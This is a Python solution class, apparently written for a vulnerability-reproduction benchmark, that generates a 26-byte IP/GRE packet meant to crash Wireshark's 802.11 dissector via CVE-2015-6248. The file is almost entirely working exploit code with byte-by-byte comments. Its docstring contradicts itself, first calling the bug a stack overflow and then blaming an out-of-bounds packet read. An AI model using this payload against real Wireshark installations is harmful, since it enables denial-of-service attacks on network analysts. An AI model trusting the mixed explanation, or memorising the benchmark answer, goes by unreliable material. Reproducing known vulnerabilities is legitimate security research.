class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for CVE-2015-6248, a stack buffer overflow in the
        Wireshark 802.11 dissector when invoked via GRE.

        The vulnerability exists in `dissect_ieee80211_common` where a crafted
        802.11 Frame Control (FC) field can cause the dissector to calculate
        an incorrect number of MAC addresses to process (`num_addr > 6`). This
        leads to a loop that copies address data from the packet into a
        fixed-size stack buffer of size 6, causing an overflow.

        The PoC consists of a minimal IP/GRE packet that encapsulates a
        malformed 2-byte 802.11 frame.

        - IP Header (20 bytes): Standard IPv4 header with protocol 47 (GRE).
        - GRE Header (4 bytes): Minimal GRE header with Protocol Type 0x88BE,
          which is registered by the 802.11 dissector in Wireshark.
        - 802.11 Payload (2 bytes): This contains only the Frame Control field,
          set to 0x000c (little-endian: b'\x0c\x00'). This value corresponds to
          Type=3 (EXT) and Subtype=0, which causes the vulnerable code path to
          determine `num_addr = 7`.

        The dissector then attempts to read 7 * 6 = 42 bytes of address data.
        Since the packet only provides 2 bytes of payload, the first attempt to
        read a 6-byte address (`tvb_get_ptr`) will read past the end of the
        packet buffer, triggering a sanitizer error and crashing the program.
        This achieves the goal with a very short PoC (26 bytes).
        """

        # IP Header (20 bytes): Total Length = 26 bytes
        ip_header = (
            b'\x45\x00'          # Version, IHL, ToS
            b'\x00\x1a'          # Total Length (26)
            b'\xde\xad'          # Identification
            b'\x00\x00'          # Flags, Fragment Offset
            b'\x40'              # TTL
            b'\x2f'              # Protocol: GRE (47)
            b'\xd8\xab'          # Header Checksum (pre-calculated)
            b'\x7f\x00\x00\x01'  # Source IP: 127.0.0.1
            b'\x7f\x00\x00\x01'  # Destination IP: 127.0.0.1
        )

        # GRE Header (4 bytes): Protocol Type for 802.11
        gre_header = (
            b'\x00\x00'          # Flags & Version
            b'\x88\xbe'          # Protocol Type: IEEE 802.11
        )

        # 802.11 Payload (2 bytes): Malicious Frame Control field
        payload = b'\x0c\x00'

        return ip_header + gre_header + payload